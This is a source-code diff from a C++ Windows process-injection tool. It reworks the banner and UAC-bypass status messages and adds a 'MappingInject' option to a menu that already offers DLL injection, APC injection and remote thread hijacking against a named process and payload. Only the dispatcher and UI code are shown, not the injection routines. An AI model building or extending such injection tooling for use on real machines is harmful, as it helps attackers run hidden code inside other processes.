+		std::cout << "  /     \\ _____  ______ ______ |__| ____    ____   |   | ____     |__| ____   _____/  |_\n";
+		std::cout << " /  \\ /  \\\\__  \\ \\____ \\\\____ \\|  |/    \\  / ___\\  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n";
+		std::cout << "/    Y    \\/ __ \\|  |_> >  |_> >  |   |  \\/ /_/  > |   |   |  \\   |  \\  ___/\\  \\___|  |  \n";
+		std::cout << "\\____|__  (____  /   __/|   __/|__|___|  /\\___  /  |___|___|  /\\__|  |\\___  >\\___  >__|  \n";
+		std::cout << "        \\/     \\/|__|   |__|           \\/     \\/            \\/\\______|    \\/     \\/       \n";
+		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
+	}
 	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
 	if (EnableDebugPrivilege() == TRUE)
 	{
@@ -689,6 +575,10 @@ void Banner(int type)
 		cout << "-----------------------------!!START!!--------------------------------" << endl;
 		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
 	}
+	if (Win32())
+		cout << "	[+] Dynamic Call Successfully :)" << endl;
+	else
+		cout << "	[-] Dynamic Call Failed :(" << endl;
 }
 
 void TrashData()
@@ -709,15 +599,15 @@ void TrashData()
 int _tmain(int argc, TCHAR* argv[])
 {
 	if (argc == 3) {
-		cout << "	    Which kind of Injection do you want?" << endl;
-		cout << "	    [1]: DLLInject" << endl << "	    [2]: APCInject" << endl << "	    [3]: ThreadHiJacking" << endl;
+		cout << "	Which kind of Injection do you want?" << endl;
+		cout << "	[1]: DLLInject" << endl << "	[2]: APCInject" << endl;
+		cout << "	[3]: ThreadHiJacking" << endl << "	[4]: MappingInject" << endl;
 		int type = 0;
 		cin >> type;
 		Banner(type);
 		if (type == 1) //DLLInject
- 		{	
+		{
 			DWORD PID = GetProcessPID(argv[1]);
-			cout << PID << endl;
 			DLLInject(PID, argv[2]);
 		}
 		else if (type == 2)  //APCInject
@@ -728,14 +618,19 @@ int _tmain(int argc, TCHAR* argv[])
 		}
 		else if (type == 3)   //ThreadHiJacking 
 		{
-			TraverseProcess(argv[1]);
+			if (!TraverseProcess(argv[1]))
+				return 0;
 			DWORD ProcessPID;
 			cin >> ProcessPID;
-			RemoteThreadHiJacking(ProcessPID,argv[2]);
+			RemoteThreadHiJacking(ProcessPID, argv[2]);
 		}
-		else{
+		else if (type == 4)  //Mapping Inject 
+		{
+			MappingInject(argv[1], argv[2]);
+		}
+		else {
 			TrashData();
-		cout << "	[-] Please choose the number below :(" << endl;
+			cout << "	[-] Please choose the number below :(" << endl;
 			return 0;
 		}
 	}
